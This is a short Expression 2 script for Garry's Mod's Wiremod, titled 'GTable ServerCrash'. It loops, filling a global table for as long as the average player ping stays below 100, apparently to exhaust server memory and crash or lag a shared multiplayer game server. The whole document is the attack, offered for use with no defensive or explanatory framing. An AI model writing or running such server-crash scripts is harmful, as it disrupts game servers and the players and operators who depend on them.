@name GTable ServerCrash by Kronos9247
@inputs 
@outputs 
@persist GT:gtable
@trigger 

interval(1)

if(first()) { GT=gTable("mksfjnssfhufshsfrhzzgfazef") }

if(perf()) {
    print(GT:count())
    
    function number serverPing()
    {
        local Ply = players()
        local Ping = 0
        for(I=1,Ply:count()) 
        {
            Ping=Ping+Ply[I,entity]:ping()
        }
        return Ping/Ply:count()
    }
}

print(serverPing())

while(perf() && serverPing() < 100) 
{
    GT[GT:count(),number]=1
}
